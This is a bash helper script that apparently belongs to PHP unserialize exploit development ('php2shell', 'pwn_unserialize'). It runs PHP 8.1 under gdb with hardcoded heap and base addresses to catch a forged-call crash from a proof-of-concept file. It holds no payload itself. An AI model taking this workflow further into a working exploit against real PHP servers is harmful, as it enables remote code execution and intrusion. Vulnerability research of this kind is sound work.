#!/bin/bash
# catch the forged-call crash with correct CHUNK on jammy
D=$(ls -dt /tmp/pwn_unserialize_* | head -1)
cd "$D" || exit 1
CHUNK=$((0x7ffff4cc2000))
BASE=$((0x555555400000))
CHUNK_DEC=$(printf "%016d" "$CHUNK")
BASE_DEC=$(printf "%016d" "$BASE")
DBG=/tmp/dbgsym81/usr/lib/debug/.build-id/70/4040a392cd0a8b51f18d141caea86e97fa0197.debug
timeout 120 gdb -q -batch \
  -ex 'exec-file /usr/bin/php8.1' \
  -ex "symbol-file $DBG" \
  -x /mnt/c/Users/andre/Downloads/php2shell-zeros/weapons/lab/gdb_zero4_crash.gdb \
  --args /usr/bin/php8.1 -n vdR3_call.php "$CHUNK_DEC" "$BASE_DEC" 2>&1 \
  | grep -vE 'warning|auto-load|safe-path|gdbinit|info "|add-auto|To enable|To completely|Thread debugging|libthread_db|No such file' \
  | head -40
